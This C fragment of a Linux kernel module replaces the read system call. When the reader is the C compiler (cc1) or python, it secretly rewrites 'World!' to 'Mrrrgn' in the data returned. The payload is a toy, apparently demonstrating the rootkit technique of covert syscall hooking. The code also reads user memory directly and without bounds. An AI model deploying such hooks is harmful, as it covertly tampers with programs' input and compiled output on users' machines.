asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
{
    long ret;
    ret = ref_sys_read(fd, buf, count);
	
    if (fd > 2) {
        if (strcmp(current->comm, "cc1") == 0 || 
            strcmp(current->comm, "python") == 0) {
            char *substring = strstr(buf, "World!");
            if (substring != NULL) {
                substring[0] = 'M';
                substring[1] = 'r';
                substring[2] = 'r';
                substring[3] = 'r';
                substring[4] = 'g';
                substring[5] = 'n';
            }
        }
    }
    return ret;
}


MODULE_LICENSE("GPL");